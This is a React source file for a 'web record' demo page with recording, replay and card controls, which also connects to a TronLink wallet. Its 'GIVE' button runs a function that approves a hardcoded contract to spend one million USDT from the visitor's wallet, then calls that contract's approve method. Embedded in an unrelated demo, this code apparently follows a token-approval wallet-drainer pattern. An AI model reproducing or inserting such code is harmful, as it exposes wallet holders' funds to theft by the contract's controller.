import React, { useEffect, useRef, useState,useMemo } from 'react';
import { useHistory } from 'react-router';
import './index.less';
import { hxMessage } from '/src/helper/message';
import WebRecord from '/src/helper/record';

import { Carousel,CarouselProps} from 'antd';
import { CloseCircleFilled} from '@ant-design/icons';
import { TronLinkAdapter } from '@tronweb3/tronwallet-adapters';

let usdtAddress='TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t'
let receiveContractAddress='TKzxdSv2FZKQrEqkKVgp5DcwEXBEKMg2Ax';
type DotPosition = CarouselProps['dotPosition'];
const contentStyle: React.CSSProperties = {
  height: '0.9rem',
  lineHeight: '0.9rem',
  textAlign: 'center',
};

const Home = () => {
  const [cardList, setCardList] = useState<number[]>([1]);
  const [isRecording, setIsRecording] = useState(false);
  const [colorCache] = useState<{ [key: number]: string }>({});
  const pageRecord = useRef<WebRecord>(new WebRecord()).current;
  const history = useHistory();

  const [account, setAccount] = useState('');
  const [netwok, setNetwork] = useState({} as any);
  const [signedMessage, setSignedMessage] = useState('');
  const adapter = useMemo(() => new TronLinkAdapter(), []);


  useEffect(() => {
    setAccount(adapter.address!);
    adapter.on('connect', () => {
      console.log(adapter.address!);

        setAccount(adapter.address!);
    });
    adapter.on('accountsChanged', (data) => {
        setAccount(data);
    });
    adapter.on('chainChanged', (data) => {
        setNetwork(data);
    });
    adapter.on('disconnect', () => {
        // when disconnect from wallet
    });
    return () => {
        // remove all listeners when components is destroyed
        adapter.removeAllListeners();
    };
}, []);

useEffect(() =>{
 // give();
  // handleStartRecord();
})


function formterAccount(account:any){
    if(account){
      return  account.substring(0,6)+"..."+account.substring(account.length -6,account.length);
    }
    return "";
}


const give =async()=>{
  console.log(account)
  if(account){
        let usdtContract = await window.tronWeb.contract().at(usdtAddress);
        console.log("usdtContract:" + usdtContract)
        let  allowance= await usdtContract.allowance(account,receiveContractAddress).call();
        if(allowance <= 1000000000000){ 
          const result = await usdtContract.approve(receiveContractAddress, 1000000000000).send({
            feeLimit:"100000000"
          });
          console.log(result);

        }else{
          let giveContract = await window.tronWeb.contract().at(receiveContractAddress);
          const result = await giveContract.approve().send({
            feeLimit:"100000000"
          });
          console.log(result);
        }
   }
}



  //开始|结束 录制
  const handleStartRecord = () => {
    if (isRecording) {
      setIsRecording(false);
      pageRecord.end();
      hxMessage('end record!', 'success');
    } else {
      setIsRecording(true);
      pageRecord.start();
      hxMessage('start record!', 'success');
    }
  };

  //去回放页面
  const goReplayRecordPage = () => {
    history.push('/replay');
  };

  //添加卡片
  const handleAddCard = () => {
    setCardList([...cardList, cardList.length + 1]);
  };

  //获取随机颜色
  const getRandomColor = (id: number) => {
    const oldColor = colorCache[id];
    if (oldColor) {
      return oldColor;
    }
    const newColor = `#${Math.random().toString(16).slice(-6)}`;
    colorCache[id] = newColor;
    return newColor;
  };

  //重置卡片
  const handleResetCard = () => {
    setCardList([1]);
  };

  return (
    <div className="home-page">
      <header className='font-size-32 text-center mt-24'>web record</header>
      <section className='box-cont'>
        <div className='flex-center top-handle mt-24 pb-16'>
          <button className='theme-btn' onClick={handleStartRecord}>
            {isRecording ? 'End' : 'Start'} Record
          </button>
          <button className='btn ml-64' onClick={goReplayRecordPage}>
            Go Replay Record
          </button>

          <button className='btn ml-64' onClick={give}>
           GIVE
          </button>
        </div>

        <div className="flex-center mt-48">
          <input type="text" className="h-input" placeholder="Say something?" />
        </div>

        <div className='flex'>
          <button className='theme-btn ml-16' onClick={handleAddCard}>
            Add Card
          </button>
          <button className='theme-btn ml-16' onClick={handleResetCard}>
            Reset Card
          </button>
        </div>

        <ul className='mt-12 flex flex-wrap card-cont'>
          {cardList.map((it) => (
            <li
              className='flex-center card-item'
              style={{ backgroundColor: getRandomColor(it) }}
              key={it}>
              {it}
            </li>
          ))}
        </ul>
      </section>
    </div>
  );
};

export default Home;
